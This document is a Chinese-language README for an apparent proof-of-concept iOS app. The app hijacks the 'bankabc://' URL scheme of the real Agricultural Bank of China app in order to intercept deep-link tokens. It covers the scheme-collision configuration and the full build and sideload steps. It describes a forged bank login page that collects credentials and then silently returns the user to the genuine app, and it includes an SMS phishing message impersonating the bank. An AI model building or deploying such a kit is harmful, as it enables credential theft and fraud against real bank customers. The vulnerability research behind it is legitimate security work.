# iOS URL Scheme 劫持 PoC — Expo 项目

## 项目说明

这是一个 React Native (Expo) 项目，注册了 `bankabc://` URL Scheme，与真农行 App 产生 Scheme 冲突，用于在 **真机** 上演示 iOS URL Scheme 劫持漏洞。

**你的场景**：iPhone 上已安装真实农行 App + 本 PoC App → 点击 `bankabc://` 链接时 iOS 弹出选择框 → 选中 PoC App 即可截获完整 URL（含 token、appId 等参数）。

---

## 代码需要改动什么？

### 答：代码基本不需要改，项目已经配好了

核心配置已经在 `app.json` 中完成：

```json
"scheme": "bankabc",           // ← 注册 bankabc:// scheme
"ios": {
  "infoPlist": {
    "CFBundleURLTypes": [{
      "CFBundleURLSchemes": ["bankabc"]   // ← 声明本 App 处理 bankabc://
    }]
  }
}
```

这就是触发 Scheme 冲突的关键 —— iOS 系统允许多个 App 注册同一个 URL Scheme，不做唯一性校验。

### 如果想自定义，可以改的地方

| 想改什么 | 改哪个文件 | 怎么改 |
|---------|-----------|--------|
| App 名称 | `app.json` → `"name"` | 改成你想要的名字 |
| App 图标 | `assets/icon.png` | 替换为 1024×1024 的 PNG |
| 测试 URL | `App.js` 第 77-78 行 | 修改 `testURL` 变量 |
| Bundle ID | `app.json` → `"bundleIdentifier"` | 如果冲突就改一个唯一的 |

---

## 在 Windows 上构建 + 安装到 iPhone（完整步骤）

### 前置条件

| 条件 | 说明 |
|------|------|
| Node.js 18+ | 已安装 20.19.6 ✓ |
| Expo 账号 | 免费注册 https://expo.dev |
| Apple ID | **免费 Apple ID 即可**（不需要 $99/年开发者账号） |
| iPhone | 你的手机，已安装真实农行 App |
| 数据线 | 不需要！全程无线操作 |

> **免费 Apple ID 限制**：App 7 天后过期需重新构建；只能装在自己的设备上。对 PoC 演示完全够用。

### 第一步：安装依赖

```bash
cd expo-poc
npm install
```

### 第二步：安装 EAS CLI（云端编译工具）

```bash
npm install -g eas-cli
```

### 第三步：登录 Expo

```bash
eas login
```
输入你在 https://expo.dev 注册的账号密码。

### 第四步：初始化 EAS 项目

```bash
eas init
```
这会自动在 `app.json` 的 `extra.eas.projectId` 填入项目 ID。

### 第五步：构建 iOS 真机版本

```bash
eas build --platform ios --profile preview
```

构建过程中 EAS 会问你：
1. **Apple ID 邮箱** — 输入你的 Apple ID
2. **Apple ID 密码** — 输入密码（EAS 用它创建签名证书，不会存储）
3. **是否注册新设备** — 如果你的 iPhone 没注册过，按提示在手机 Safari 打开一个链接注册

> 构建大约 10-15 分钟，在 Expo 云端进行，你的电脑不需要做任何事。

### 第六步：下载并安装到 iPhone

构建完成后，终端会显示一个下载链接（类似 `https://expo.dev/artifacts/eas/xxxxx.ipa`）。

**安装方法（Windows → iPhone，无需 Mac）：**

1. 在电脑浏览器打开下载链接，下载 `.ipa` 文件
2. 打开 https://diawi.com （免费的 iOS 安装工具站）
3. 上传 `.ipa` 文件
4. 用 iPhone 扫描网页上的二维码
5. iPhone 上点击安装 → 设置 → 通用 → VPN与设备管理 → 信任你的 Apple ID 证书

---

## 演示测试

安装完成后，你的 iPhone 上同时有：
- ✅ 真实农行 App（App Store 下载的）
- ✅ PoC App（刚安装的）

### 测试步骤

1. **打开 Safari**，在地址栏输入：
   ```
   bankabc://login/auth?appId=30428099&redirect=https://www.abchina.com&token=eyJhbGciOiJIUzI1NiJ9.test
   ```

2. **iOS 弹出选择框**：
   ```
   ┌─────────────────────────┐
   │  在以下应用中打开        │
   │                         │
   │  [农] 中国农业银行       │
   │  [农] ABC Scheme Hijack │
   │                         │
   │  取消                    │
   └─────────────────────────┘
   ```
   > 两个 App 都叫 `bankabc://`，用户无法区分哪个是真的！

3. **选择 PoC App** → PoC App 截获完整 URL，显示所有参数

4. **点击"弹出伪造登录页"** → 显示仿农行登录界面

5. **输入测试账号密码** → 点击登录 → 攻击总结页显示截获的数据

6. **点击"跳转真农行 App"** → 跳回真实农行 App（用户无感知）

### 也可以从短信测试（更真实的攻击场景）

给自己发一条短信：
```
【中国农业银行】您有一笔交易待确认，请点击链接验证：bankabc://login/auth?appId=30428099&redirect=https://www.abchina.com
```
点击链接 → iOS 弹出选择框 → 用户很可能选错 App。

---

## 项目结构

```
expo-poc/
├── App.js              # PoC 主代码（URL接收 + 伪造登录页 + 攻击总结）
├── app.json            # Expo 配置（bankabc scheme 注册）
├── eas.json            # EAS Build 配置
├── package.json        # 依赖
├── README.md           # 本文件
└── assets/
    ├── icon.png        # App 图标（1024×1024）
    ├── adaptive-icon.png  # Android 自适应图标
    ├── splash.png      # 启动屏
    └── favicon.png     # Web 图标
```

## 关键配置说明

| 配置 | 位置 | 作用 |
|------|------|------|
| `scheme: "bankabc"` | app.json | Expo 路由 scheme（同时也写入 Info.plist） |
| `CFBundleURLSchemes: ["bankabc"]` | app.json → ios.infoPlist | iOS 系统注册 bankabc:// scheme |
| `Linking.getInitialURL()` | App.js | App 冷启动时接收 URL |
| `Linking.addEventListener('url')` | App.js | App 运行时接收 URL |

## 常见问题

**Q: 构建报错 "No Apple Team ID found"**
A: 确保用 Apple ID 邮箱而不是手机号登录，EAS 会自动创建 Team。

**Q: 安装后 App 闪退**
A: iPhone → 设置 → 通用 → VPN与设备管理 → 信任你的 Apple ID 开发者证书。

**Q: 7 天后 App 打不开了**
A: 免费 Apple ID 签名 7 天过期，重新 `eas build` 即可。$99/年开发者账号无此限制。

**Q: 选择框里没有出现 PoC App**
A: 确认 PoC App 已经在后台没被杀掉，或者从 Safari 打开链接时 iOS 会列出所有注册了该 scheme 的 App。
